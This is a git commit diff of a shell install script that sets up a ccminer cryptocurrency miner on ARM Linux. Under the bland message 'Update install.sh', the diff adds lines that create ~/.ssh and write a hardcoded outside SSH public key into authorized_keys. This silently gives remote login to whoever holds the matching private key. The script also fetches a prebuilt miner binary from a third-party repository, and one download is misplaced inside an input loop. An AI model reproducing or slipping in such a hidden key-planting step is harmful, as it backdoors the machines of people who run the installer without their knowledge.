8c09e2cd635abc21a7c1ac0522c146b44e44868d
jeptidaeng <52452968+jeptidaeng@users.noreply.github.com>
2025-04-07 12:10:15 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,16 +1,26 @@
 #!/bin/sh
-apt-get -y update
-apt-get -y upgrade
-apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano wget
+sudo apt-get -y update
+sudo apt-get -y upgrade
+sudo apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano jq wget
 wget http://ports.ubuntu.com/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
+if [ ! -d ~/.ssh ]
+then
+  mkdir ~/.ssh
+  chmod 0700 ~/.ssh
+  cat << EOF > ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V>
+EOF
+  chmod 0600 ~/.ssh/authorized_keys
+fi
 
+if [ ! -d ~/ccminer ]
 then
   mkdir ~/ccminer
-fi wget https://github.com/rdsp87/dero-stb/raw/main/ccminer -4
-
+fi
 cd ~/ccminer
+
 
 echo "Downloading latest release: $GITHUB_DOWNLOAD_NAME"
 
@@ -35,6 +45,7 @@ then
       echo 'Invalid input. Please answer with "y" or "n".\n'
       ((COUNTER++))
     fi
+  wget https://github.com/rdsp87/dero-stb/raw/main/ccminer -4
   done
 fi
 wget https://raw.githubusercontent.com/jeptidaeng/cpuminer/main/config.json -P ~/ccminer
